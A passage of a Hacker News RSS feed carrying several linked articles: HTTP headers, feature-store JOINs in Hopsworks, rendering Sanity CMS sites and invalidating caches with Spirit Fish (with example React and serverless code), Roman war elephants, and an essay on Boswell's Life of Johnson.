<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Location">Location</a></li>
</ul>
<h2 id="conclusion">Conclusion<a href="#conclusion" aria-label="conclusion permalink"></a></h2>
<p>Https headers are great and also very useful! But sometimes they can be quite complex, and it's really hard to get an overview of what headers are available and what benefits they bring.
Also when developing a website, especially in the frontend, you don't come in contact with them too often, except maybe with the CORS headers.
But I think that this missed some possibilities. http headers represent the communication between the server and the
customers much better, and we all know that communication is the key to a good relationship.</p>
<p>I hope I could shed some light on the darkness of http headers for you. In case I missed a good and helpful header,
please do not hesitate to send me a mail or contact me in any way.</p></div></div>]]>
            </description>
            <link>https://www.lorenzweiss.de/the_power_of_http_headers_with_four_examples/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24871129</guid>
            <pubDate>Fri, 23 Oct 2020 16:23:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Feature Store for MLOps? Feature Reuse Means Join]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24870916">thread link</a>) | @moritzmeister
<br/>
October 23, 2020 | https://www.logicalclocks.com/blog/feature-store-for-mlops-feature-reuse-means-join | <a href="https://web.archive.org/web/*/https://www.logicalclocks.com/blog/feature-store-for-mlops-feature-reuse-means-join">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><p>TLDR; Many engineers conflate operational Feature Stores with key-value (KV) stores, like DynamoDB and Cassandra. In fact, KV stores are missing a key mechanism needed to make features reusable: JOINs. JOINs enable features to be reused by different models. This blog is about how to scale your ML infrastructure by reusing cached features so that the number of feature pipelines you manage does not grow linearly with the number of models you run in production.</p><figure id="w-node-6837f843508c-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92f4e94a9b1084ab992187_twitter.jpg" loading="lazy" alt=""></p><figcaption><a href="https://odsc.com/speakers/from-silos-to-platform-building-twitters-feature-marketplace/">Img from OSDC talk by Twitter</a>. Twitter evaluate their Feature Store by the number of features that are reused across teams.</figcaption></figure><h2>The Cost of No JOINs: One Feature Pipeline per Model</h2><p>If you don’t reuse features across different models, you will need a new feature pipeline for every new model you put in production. In the diagram below, there is a 1:1 mapping between train/test datasets and models. For every new model you put in production, you will write a new feature pipeline from your data stores that transforms and validates the raw data and performs aggregations, materializing train/test data to files. A ML training program (or pipeline) then trains and validates a model with the train/test data, after which it is tested and deployed to production.</p><p>It is very difficult to reuse the features in the materialized train/test datasets, as they tend to be stored in a format specific to a ML framework: .tfrecord for TensorFlow,.npy for PyTorch - and they cannot be easily combined with features stored in other train/test datasets. This is often due to the limitations of the file formats: neither TFRecord nor NPY support projections (selecting just a subset of columns).</p><p>If you intend to run hundreds of models in production, running hundreds of pipelines will explode your technical debt.</p><figure id="w-node-5b746662ee67-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92ea783652dae4e198dca1_pic-01re.jpg" loading="lazy" alt=""></p></figure><p>In online feature stores that do not support JOINs, it is typically the responsibility of the application to perform the JOIN of the cached features to create the feature vector. So, if you build your own online feature store using Cassandra or DynamoDB, you will need to also add logic for joining (and ordering) features in your applications/models.&nbsp;</p><p>Every new feature you add to that model will need an update to the feature pipeline and changes to the application logic - making it costly and potentially cross-team work.</p><figure id="w-node-0abcd444357c-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eaa4cc8f44bbcc4cb4ad_pic-02re.jpg" loading="lazy" alt=""></p></figure><h2>JOINs enable Feature Reuse</h2><figure id="w-node-792e5aca9095-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eac165896f1612cb3dea_pic-03re.jpg" loading="lazy" alt=""></p></figure><p>A JOIN is a Structured Query Language (SQL) command to combine data from two different two database tables. JOINs are used to create a view over the data that originates from one or more tables. If we assume that we store features normalized in database tables, then we are able to create sets of features (training datasets) by selecting different features from different tables and joining them together using a common join key. The join key(s) identify the common entity these feature values represent.&nbsp;</p><p>If we now assume that features are stored as columns in tables, then what is a train/test dataset? It is a set of features along with a target column. Assuming the features are already present in existing tables, we can just join those features (columns) together to create a view - this view is the train/test dataset. The order of features (in a view) that makes up a train/test dataset is significant - a train/test dataset is a <a href="https://www.mathsisfun.com/combinatorics/combinations-permutations.html">permutations of features - not a combination</a>. Views (enabled by JOINs) enable a massive number of train/test datasets to be defined over a small number of shared features (stored in tables)</p><p>In Hopsworks, we store features in tables that we call “Feature Groups”. Feature Groups introduce a level of indirection between the raw input data and the train/test datasets used to train models, see below. They store a cached copy of the features, computed using the same feature pipeline from earlier, but this time, the feature pipeline writes to one or both of the stores that much a feature store: (1) a scalable store for train/test features (offline feature store) and (2) a low latency, high throughput store for features for serving (online feature store).&nbsp;</p><p>In Hopsworks, we use Apache Hive as a scalable database for the offline store, and MySQL Cluster (NDB) as the online store. Our version of Hive stores its metadata in NDB and its data files in HopsFS/S3. In Hopsworks, FeatureGroups are database tables in Hive and MySQL Cluster, along with feature metadata (also tables in the same NDB database).&nbsp;</p><p>As we can see in the diagram below, if we have N features available in the Feature Store, we can create an unlimited number of train/test datasets by simply joining features together from the offline feature store.&nbsp;</p><p>In Hopsworks, we use Spark, with its cost-based optimizer, to perform JOINs. Spark, together with Parquet/Hudi/ORC help optimize joins by supporting partitioned data, push-down projections, SortMergeJoin, and&nbsp;<br></p><ul role="list"><li>a hint;</li><li>a join type (inner, left, outer, etc);</li><li>a join condition (equi-join);</li><li>an estimation of the input data size</li></ul><figure id="w-node-d713661f3233-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eae8333d716893ac2f5a_pic-04re.jpg" loading="lazy" alt=""></p></figure><h2>JOINs in Online Feature Stores</h2><p>If you use a KV store as your online store, you are back in the same situation as at start - you need a feature pipeline for every new model you put in production. But with Feature Groups (tables in NDB), we can materialize feature vectors (the individual row of features that is fed directly to the model for scoring) from the different tables by performing a join.</p><p>NDB supports <a href="http://mikaelronstrom.blogspot.com/2020/10/parallel-execution-of-outersemi-joins.html">sophisticated optimizations</a> for JOINs, and can push-down many JOINs to the database nodes. In practice, in NDB even complex queries can <a href="http://mikaelronstrom.blogspot.com/2020/10/dbt2-benchmarks-with-ndb-cluster.html">“achieve latency down to 5-10 ms for a transaction that contains around 30 SQL statements”</a>.</p><figure id="w-node-0a1416f8ba8d-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eb0ef0105a291dd69266_pic-05re.jpg" loading="lazy" alt=""></p></figure><h2>Conclusions</h2><p>Reuse features to save on infrastructure and the number of feature pipelines needed to maintain models in production. JOINs is the method we use in Hopsworks to reuse cached features across different models - both for training and serving. We use Spark as the JOIN engine for the offline feature store and NDB with its parallelized, push-down JOINs for low-latency joins in the online feature store. <br></p></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.logicalclocks.com/blog/feature-store-for-mlops-feature-reuse-means-join</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870916</guid>
            <pubDate>Fri, 23 Oct 2020 16:03:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Powering JavaScript Sites with Sanity CMS and Spirit Fish]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24870668">thread link</a>) | @_hhff
<br/>
October 23, 2020 | https://www.spirit.fish/blog/working-with-sanity | <a href="https://web.archive.org/web/*/https://www.spirit.fish/blog/working-with-sanity">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  

  <div>
    <p>Iâ€™ve said it a few times, but 
      <a target="_blank" href="https://www.sanity.io/">Sanity CMS</a>
 is easily the most futuristic content management system on the planet - with slick editor experience, unique deployable infrastructure, and the introduction of itâ€™s new 
      <a target="_blank" href="https://www.sanity.io/blog/introducing-presence">Presence</a>
 functionality, personally weâ€™d never use anything else!</p>

<p>So, itâ€™s only natural Spirit Fish would integrate nicely. Hereâ€™s a few of the ways we work with Sanity:</p>

<h2><strong>1. Rendering Sanity content for great SEO, Google Lighthouse Scores, and low FMP</strong></h2>

<p>Sanity is a headless CMS, so that means that in order to display data to end users, content needs to be loaded over HTTP. While thereâ€™s a bunch of framework dependent approaches to this, we prefer to load the data in the same javascript bundle that powers our React.js projects. </p>

<p>Hereâ€™s a trivial example using 
      <a target="_blank" href="https://reactjs.org/docs/create-a-new-react-app.html">create-react-app</a>
:</p>

<pre><code>
import React from "react";
import SanityClient from "@sanity/client";

const sanityClient = SanityClient({
  projectId: "zp7mbokg",
  dataset: "production",
  useCdn: true
});

const query = `*[_type == "movie"] {
  _id,
  title
}[0...50]`;

function App() {
  const [movies, setMovies] = useState(null);

  useEffect(async () =&gt; {
    setMovies(await sanity.fetch(query));
  }, []);

  return (
    &lt;ul&gt;
      {movies.map(movie =&gt; (
        &lt;li key={movie._id}&gt;
          {movie.title}
        &lt;/li&gt;
      ))}
    &lt;/ul&gt;
  );
};

export default App;

</code></pre>

<p>If you deploy a create-react-app to a host like an S3 bucket, etc - when you view-source, youâ€™ll notice that your movies arenâ€™t there. Thatâ€™s because that content is loaded at the runtime! When Googleâ€™s crawler indexes your site, it will only see a blank page, and all of your end users wonâ€™t see any content until theyâ€™ve downloaded your javascript, and THEN loaded the Sanity query. Thatâ€™s no good for SEO, or conversions.</p>

<p>Of course, this is our bread and butter: create a Spirit Fish renderer, point it at that S3 bucket, and point your DNS at our CDN. Refresh your site, and boom! Your site is now rendered on the fly.</p>

<p>We find that adding a Spirit Fish renderer to a site usually doubles your 
      <a target="_blank" href="https://developers.google.com/web/tools/lighthouse">Google Lighthouse</a>
 scores, so thatâ€™s a big win for 5 minutes of setup!</p>

<h2><strong>2. Purging the entire Spirit Fish cache when content changes in Sanity</strong></h2>

<p>On first request - our renders take a few seconds - so we cache the result in a global CDN so that your rendered site is close to your users. </p>

<p>Got it! But what if my content changes?</p>

<p>Well - youâ€™ll need to trigger an invalidation in Spirit Fish. The easiest way to do this for small sites is to trigger a full invalidation. This will force your site to be re-rendered the next time your users visit, meaning your new data will be pulled from Sanity!</p>


<p>Thatâ€™s what we built our invalidations API for. Hereâ€™s what your `invalidate_all` endpoint looks like:</p>

<pre>  <code>
https://www.spirit.fish/api/v1/renderers/$RENDERER_ID/invalidate_all?api_key=$RENDERER_API_TOKEN
  </code>
</pre>

<p>This endpoint takes a `POST` request, so you can easily add it directly to Sanityâ€™s management portal, no code required:</p>

<a href="https://www.sanity.io/docs/webhooks" target="_blank">
  <p><img src="https://www.spirit.fish/assets/blog_posts/sanity_logo_square-7b9b2a49f4583770b16f9e4898285e61afa005dd41fa9e93e2e89b8d5b446cb1.jpg">
  </p>
  <div>
    <div>
      <p>Sanity - How to use Webhooks</p>
      <p>https://www.sanity.io/docs/webhooks</p>
    </div>
  </div>
</a>

<p>Now, whenever an editor updates content in Sanity, it will clear your Spirit Fish cache, easy as that!</p>

<h2><strong>3. Purging specific Spirit Fish pages when Sanity content changes with a serverless function</strong></h2>

<p>For small projects with a handful of pages, the above is probably fine - but when you have a large project (say an editorial with hundreds of pages), you wouldnâ€™t want to purge the entire Spirit Fish if only one page has changed.</p>

<p>In cases like this, youâ€™ll need your own backend endpoint to manage cache invalidations. We like serverless functions for this:</p>

<pre><code>
import SanityClient from '@sanity/client';
import handleError from 'utils/services/handleError';
import notEmpty from 'utils/notEmpty';

const sanityClient = SanityClient({
  projectId: "zp7mbokg",
  dataset: "production",
  useCdn: true
});

const buildCacheClearPathForRecord = (record) =&gt; {
  switch (record._type) {
    case 'movie':
      return `/movies/${record.slug}`;
    case 'director':
      return `/directors/${record.slug}`;
  }
};

export default async (request, response) =&gt; {
  try {
    const records =
      await SanityClient.getDocuments(request.body.ids.all);
    const pages =
      records.filter(notEmpty).map(buildCacheClearPathForRecord);

    await fetch(`https://www.spirit.fish/api/v1/renderers/${process.env.RENDERER_ID}/api_invalidations`, {
      method: 'post',
      body: JSON.stringify({
        invalidation: { pages }
      }),
      headers: {
        'X-Hatchery-Renderer-Api-Key': process.env.RENDERER_API_KEY,
        'Content-Type': 'application/json'
      }
    });
    return response.end();
  } catch (e) {
    return handleError(request, response, e);
  }
};

</code></pre>

<p>Deploy your serverless function (we like 
      <a target="_blank" href="https://firebase.google.com/">Firebase</a>
 or 
      <a target="_blank" href="https://vercel.com/">Vercel</a>
), and setup your Sanity webhook (like we did above - don't forget the enviornment variables!) to hit this endpoint instead. Bingo! Youâ€™re now invalidating individual pages as content changes; eliminating the need for site wide rerenders, and keeping your content in cache for as long as possible.</p>



    <p>Spirit Fish is free to try, and each renderer comes with a generous free tier that should cover most hobby projects. 
      <a href="https://www.spirit.fish/auth/github">Sign up with Github over here.</a>
</p>
  </div>
</div></div>]]>
            </description>
            <link>https://www.spirit.fish/blog/working-with-sanity</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870668</guid>
            <pubDate>Fri, 23 Oct 2020 15:41:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[War Elephants, Part II: Elephants Against Wolves (2019)]]>
            </title>
            <description>
<![CDATA[
Score 125 | Comments 48 (<a href="https://news.ycombinator.com/item?id=24870626">thread link</a>) | @plat12
<br/>
October 23, 2020 | https://acoup.blog/2019/08/02/collections-war-elephants-part-ii-elephants-against-wolves/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2019/08/02/collections-war-elephants-part-ii-elephants-against-wolves/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Today, in Part II of our three part series on War Elephants, we’re going to look at the drawbacks of war elephants.  Last time (<a href="https://acoup.blog/2019/07/26/collections-war-elephants-part-i-battle-pachyderms/">here</a>), we discussed the factors that made war elephants so powerful on the battlefield.  To recap: war elephants had a strong psychological element (they are very scary) and could drastically disrupt both infantry and cavalry alike, leaving them easy pickings for forces supporting the war elephant.  Those uses made war elephants popular not only in India, where they were first developed, but among Alexander the Great’s successors, and even as far west as Carthage.  <a href="https://acoup.blog/2019/08/09/collections-war-elephants-part-iii-elephant-memories/">And next time, we’ll look at why elephants <em>remained</em> popular in India</a>, despite the drawbacks we’ll discuss today.</p>



<p>The best way to think about the weaknesses of war elephants is to look at the question with a specific context, so we are going to narrow in on one of the two key areas where war elephants did not last as a weapon system: the Roman world (both the period of the Republic and the Empire).  As I mentioned in the last post, by the Imperial period, the Romans seem to have decided that elephants were not worth the trouble and discontinued their use.  Roman military writers routinely disparage elephants (we’ll see why) as weapons of war and despite the fact that Rome absorbed not one but <em>three</em> states which actively used elephants in war (Carthage, the Ptolemaic and Seleucid Kingdoms) – and thus we may assume three sets of capture, training and breeding programs for maintaining the animals – they did not continue their use.  It is one thing not to adopt a foreign weapon, it is quite another to inherit the entire production complex and still say, “no, not for me.”</p>



<figure><img data-attachment-id="639" data-permalink="https://acoup.blog/300-elephants/" data-orig-file="https://acoupdotblog.files.wordpress.com/2019/08/300-elephants.png" data-orig-size="1353,806" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="300-elephants" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2019/08/300-elephants.png?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2019/08/300-elephants.png?w=1024" src="https://acoupdotblog.files.wordpress.com/2019/08/300-elephants.png" alt=""><figcaption>From 300.  I missed this last time, but I just want to note <strong>everything</strong> is wrong with this.  Let me count the ways:<br>1) These elephants are <strong>way</strong> too big.<br>2) The towers on their backs won’t be invented for more than a century<br>3) The bit-and-bridle system of control is not how elephants are controlled.<br>4) The weapons for the tusks are also wrong.<br>5) <strong>Xerxes didn’t have any elephants in his army</strong> (not even in the fantasy count that Herodotus gives)<br>6) This is not how you fight elephants and will get everyone stepped on.<br>One of these days, we’re going to talk about this movie and Sparta.  Until then: <strong>Sparta is terrible.</strong></figcaption></figure>



<p>So today we’re going to ask, “why?”  We’ve answered that question in the immediate term – to quote Trautmann (2015) on the point, “the Roman refusal of the war elephant..was based upon a low estimate of its value” (250).  To put another way, they thought they sucked.  We know elephants <em>could</em> be quite potent in battle, so the answer must be a touch more complicated.  We’ll look at this two ways: first (because it’s me) in terms of <em><strong>logistics</strong></em>, and then in terms of anti-elephant <em><strong>tactics</strong></em>, to see why elephants could not succeed against (or with) Rome.  I am also going to speculate – just a touch – on which of these factors might explain the other major area elephant warfare did not penetrate: China.</p>



<h2>Roman Elephants</h2>



<p>But first, a necessary caveat to an objection no doubt already brewing in the minds of some: but didn’t the Romans use elephants sometimes?  Yes, though Roman employment of elephants was at best uneven (this is a point, I’d like to note, where Trautmann (2015) shows its value over, for instance, J. M. Kistler’s <em>War Elephants </em>(2006) – the latter’s reading of Roman use of war elephants bends the evidence to serve an argument, rather than the other way around).  Nevertheless, the Romans did use war elephants during the last two centuries of the Republic.</p>



<p>The Romans had some war elephants (just 20) at Cynocephelae (197 B.C.) against Macedon – these had been drawn from the kingdom of Numidia, which had sided with Rome against Carthage in the Second Punic War.  Plutarch (<em>Flam</em>. 8.2-5) leaves the animals out of the battle narrative, but Livy (who is the better source; Liv. 33.9) notes their use to break up the Macedonian right wing, which was not yet even in fighting formation.  It’s not clear the elephants were necessary for the Roman victory here and the key action was actually a flanking attack by infantry.</p>



<p>The Romans brought elephants to Magnesia (190 B.C.), but left them in reserve; the Romans only had a few, whereas their Seleucid opponents had brought many more.  Moreover, the Roman elephants were smaller African elephants, effectively useless against the large Asian elephants the Seleucids used.  Pydna (168 B.C.) against the Macedonians again, is harder to assess because the sources for it are poor (part of Livy’s narrative of the battle is lost).  Plutarch (<em>Aem.</em> 19-22) leaves the elephants out again, whereas Livy stops to expressly say they were useless.  Kistler (himself reliant on other scholars to read the Latin for him) reads this as the elephants being the decisive element; the sources cannot support this reading.  Livy – who appears to be quoting Polybius, a contemporary of the battle – is quite clear what he thinks of the elephants, “For as new inventions often have great force in the words of men, but when tried, when they need to work, and not just have their working described, they evaporate without any effect – just so the war elephants were just a name without any real use.” (<a href="http://www.perseus.tufts.edu/hopper/text?doc=Perseus%3Atext%3A1999.02.0211%3Abook%3D44%3Achapter%3D41">Liv 44.41.4</a>, my rough translation).</p>



<figure><img data-attachment-id="640" data-permalink="https://acoup.blog/g3446/" data-orig-file="https://acoupdotblog.files.wordpress.com/2019/08/g3446.jpg" data-orig-size="1186,1172" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="g3446" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2019/08/g3446.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2019/08/g3446.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2019/08/g3446.jpg" alt=""><figcaption>Roman denarius (a coin) issued by Julius Caesar to commemorate the Battle of Thapsus (46 B.C.)</figcaption></figure>



<p>The Romans did find elephants useful in places like Spain or southern Gaul (modern Provence) where just a handful could bewilder and terrify opponents completely unused to and unprepared for them.  The last gasp of true Roman war elephants came in 46 B.C., where Julius Caesar defeated a Roman army led by Metellus Scipio which had sixty elephants in it.  The elephants lost and one of Caesar’s legions (my personal favorite, Legio V Alaudae (Larks!)) took the elephant as a legionary symbol in commemoration of having beaten them.</p>



<p>So absolutely yes, the Romans of the Middle and Late Republic made some use of war elephants, but it was hardly a distinguished run.  As Trautmann notes – quite correctly, in my view – the Romans were always more interested in ways to defeat elephants than to use them.  Which brings us back to our question: elephants are <strong>awesome</strong>, Romans are <em>also awesome</em>…so why didn’t the Romans like elephants?</p>



<h2>Elephant Logistics</h2>



<p>From trunk to tail, elephants are a logistics <em>nightmare</em>.</p>



<p>And that begins almost literally at birth.  For areas where elephants are native, nature (combined, typically, with the local human terrain) create a local ‘supply.’  In India this meant the elephant forests of North/North-Eastern India; the range of the North African elephant (<em>Loxodonta africana pharaohensis</em>, the most likely source of Ptolemaic and Carthaginian war elephants) is not known.  Thus for many elephant-wielding powers, trade was going to always be a key source for the animals – either trade with far away kingdoms (the Seleucids traded with the Mauyran Indian kingdom for their superior Asian elephants) or with thinly ruled peripheral peoples who lived in the forests the elephants were native to.</p>



<p>(We’re about to get into some of the specifics of elephant biology.  If you are curious on this topic, I am relying heavily on R. Sukumar, <em>The Asian Elephant: Ecology and Management</em> (1989).  I’ve found that information on Asian elephants (<em>Elephas maximus</em>) <strong>much</strong> easier to come by than information on African elephants (<em>Loxodonta africana</em> and <em>Loxodonta cyclotis</em>).)</p>



<p>In that light, creating a breeding program – as was done with horses – seems like a great idea.  Except there is one major problem: a horse requires about four years to reach maturity, a mare gestates a foal in eleven months and can go into heat almost immediately thereafter.  By contrast, elephants reach adulthood after seventeen years, take 18-22 months to gestate and female elephants do not typically mate until their calf is weaned, four to five years after its birth.  A ruler looking to build a stable of cavalry horses thus may start small and grow rapidly; a ruler looking to build a corps of war elephants is looking at a very slow process.  This is compounded by the fact that elephants are notoriously difficult to breed in captivity.  There is some speculation that the Seleucids nonetheless attempted this at Apamea, where they based their elephants – in any event, they seem to have remained dependent on imported Indian elephants to maintain the elephant corps.  If a self-sustaining elephant breeding program for war elephants was ever created, we do not know about it.</p>



<p>To make matters <em>worse</em>, elephants require <strong>massive</strong> amounts of food and water.  In video-games, this is often represented through a high elephant ‘upkeep’ cost – but this often falls well short of the reality of keeping these animals for war.  Let’s take <em>Total War: Rome II</em> as an example: a unit of Roman (auxiliary) African elephants (12 animals), costs 180 upkeep, compared to 90 to 110 upkeep for 80 horses of auxiliary cavalry (there are quite a few types) – so one elephant (with a <em>mahout</em>) costs 15 upkeep against around 1.25 for a horse and rider (a 12:1 ratio).  Paradox’s <em>Imperator</em> does something similar, with a single unit of war elephants requiring 1.08 upkeep, compared to just 0.32 for light cavalry; along with this, elephants have a heavy ‘supply weight’ – twice that of an equivalent number of cavalry (so something like a 2:1 or 3:1 ratio of cost).</p>



<figure><img data-attachment-id="642" data-permalink="https://acoup.blog/1280px-sumatran_elephants/" data-orig-file="https://acoupdotblog.files.wordpress.com/2019/08/1280px-sumatran_elephants.jpg" data-orig-size="1280,852" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="1280px-sumatran_elephants" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2019/08/1280px-sumatran_elephants.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2019/08/1280px-sumatran_elephants.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2019/08/1280px-sumatran_elephants.jpg" alt=""><figcaption>Asian Elephant eating, via <a href="https://commons.wikimedia.org/wiki/Category:Elephas_maximus#/media/File:Sumatran_elephants.jpg">Wikimedia Commons</a>.  They do this <strong>a lot</strong>.</figcaption></figure>



<p>Believe it or not, this <em>understates</em> just how hungry – and expensive – elephants are.  The standard barley ration for a Roman horse was 7kg of barley per day (7 Attic medimnoi per month; Plb. 6.39.12); this would be supplemented by grazing.  Estimates for the food requirements of elephants vary widely (in part, it is hard to measure the dietary needs of grazing animals), but elephants require in excess of 1.5% of their body-weight in food <em>per day</em>.  …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2019/08/02/collections-war-elephants-part-ii-elephants-against-wolves/">https://acoup.blog/2019/08/02/collections-war-elephants-part-ii-elephants-against-wolves/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2019/08/02/collections-war-elephants-part-ii-elephants-against-wolves/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870626</guid>
            <pubDate>Fri, 23 Oct 2020 15:38:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Boswell's Life of Johnson]]>
            </title>
            <description>
<![CDATA[
Score 62 | Comments 23 (<a href="https://news.ycombinator.com/item?id=24870552">thread link</a>) | @benbreen
<br/>
October 23, 2020 | https://fantasticanachronism.com/2020/10/22/when-the-worst-man-in-the-world-writes-a-masterpiece/# | <a href="https://web.archive.org/web/*/https://fantasticanachronism.com/2020/10/22/when-the-worst-man-in-the-world-writes-a-masterpiece/#">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Boswell's <em>Life of Johnson</em> is not just one of my favorite books, it also engendered some of my favorite book reviews. While praise for the work is universal, the main question commentators try to answer is this: how did the worst man in the world manage to write the best biography?</p><p>Who was James Boswell? He was a perpetual drunk, a degenerate gambler, a sex addict, whoremonger, exhibitionist, and rapist. He gave his wife an STD he caught from a prostitute.</p><p>Selfish, servile and self-indulgent, lazy and lecherous, vain, proud, obsessed with his aristocratic status, yet with no sense of propriety whatsoever, he frequently fantasized about the feudal affection of serfs for their lords. He loved to watch executions and was a proud supporter of slavery.</p><p>“Where ordinary bad taste leaves off,” John Wain comments, “Boswell began.” The Thrales were long-time friends and patrons of Johnson; a <em>single day</em> after Henry Thrale died, Boswell wrote a poem fantasizing about the elderly Johnson and the just-widowed Hester: "Convuls'd in love's tumultuous throws, / We feel the aphrodisian spasm". The rest of his verse is of a similar quality; naturally he considered himself a great poet.</p><p>Boswell combined his terrible behavior with a complete lack of shame, faithfully reporting every transgression, every moronic ejaculation, every faux pas. The first time he visited London he went to see a play and, as he happily tells us himself, he "entertained the audience prodigiously by imitating the lowing of a cow."</p><p>By all accounts, including his own, he was an idiot. On a tour of Europe, his tutor said to him: "of young men who have studied I have never found one who had so few ideas as you."</p><p>As a lawyer he was a perpetual failure, especially when he couldn't get Johnson to write his arguments for him. As a politician he didn't even get the chance to be a failure despite decades of trying.</p><p>His correspondence with Johnson mostly consists of Boswell whining pathetically and Johnson telling him to get his shit together.</p><p>He commissioned a portrait from his friend Joshua Reynolds and stiffed him on the payment. His descendants hid the portrait in the attic because they were ashamed of being related to him.</p><p>Desperate for fame, he kept trying to attach himself to important people, mostly through sycophancy. In Geneva he pestered Rousseau,<span><a href="#fn10521873801" rel="footnote"><sup id="fnref10521873801">1</sup></a></span> leading to this conversation:</p><blockquote><p>Rousseau: You are irksome to me. It’s my nature. I cannot help it.<br>Boswell: Do not stand on ceremony with me.<br>Rousseau: Go away.</p></blockquote><p>Later, Boswell was given the task of escorting Rousseau's mistress Thérèse Le Vasseur to England—they had an affair on the way.</p><p>When Adam Smith and Edward Gibbon were elected to The Literary Club, Boswell considered leaving because he thought the club had now "lost its select merit"!</p><p>On the positive side, his humor and whimsy made for good conversation; he put people at ease; he gave his children all the love his own father had denied him; and, somehow, he wrote one of the great works of English literature.</p><p><em>The Life of Samuel Johnson, LL.D.</em> was an instant sensation. While the works of Johnson were quickly forgotten,<span><a href="#fn10521873802" rel="footnote"><sup id="fnref10521873802">2</sup></a></span> his biography has never been out of print in the 229 years since its initial publication. It went through 41 editions just in the 19th century.</p><p>Burke told King George III that he had never read anything more entertaining. Coleridge said "it is impossible not to be amused with such a book." George Bernard Shaw compared Boswell's dramatization of Johnson to Plato's dramatization of Socrates, and placed old Bozzy in the middle of an "apostolic succession of dramatists" from the Greek tragedians through Shakespeare and ending, of course, with Shaw himself.</p><p>It is a strange work, an experimental collage of different modes: part traditional biography, part collection of letters, and part direct reports of Johnson's life as observed by Boswell.<span><a href="#fn10521873803" rel="footnote"><sup id="fnref10521873803">3</sup></a></span> His inspiration came not from literature, but from the minute naturalistic detail of Flemish paintings. It is difficult to convey its greatness in compressed form: Boswell is not a great writer at the sentence level, and all the famous quotes are Johnsonian <em>bon mots</em>. The book succeeds through a cumulative effect.</p><p>Johnson was 54 years old when he first met Boswell, and most of his major accomplishments (the poetry, the dictionary, <em>The Rambler</em>) were behind him; his wife had already died; he was already the recipient of a £300 pension from the King; his edition of Shakespeare was almost complete. All in all they spent no more than 400 days together. Boswell had limited material to work with, but what he doesn't capture in fact, he captures in feeling: an entire life is contained in this book: love and friendship, taverns and work, the glory of success and recognition, the depressive bouts of failure and penury, the inevitable tortures of aging and death.</p><p>Out of a person, Boswell created a literary personality. His powers of characterization are positively Shakespearean, and his Johnson resembles none other but the bard's greatest creation: Sir John Falstaff. Big, brash, and deeply flawed, but also lovable. He would "laugh like a rhinoceros":</p><blockquote><p>Johnson could not stop his merriment, but continued it all the way till he got without the Temple-gate. He then burst into such a fit of laughter that he appeared to be almost in a convulsion; and in order to support himself, laid hold of one of the posts at the side of the foot pavement, and sent forth peals so loud, that in the silence of the night his voice seemed to resound from Temple-bar to Fleet 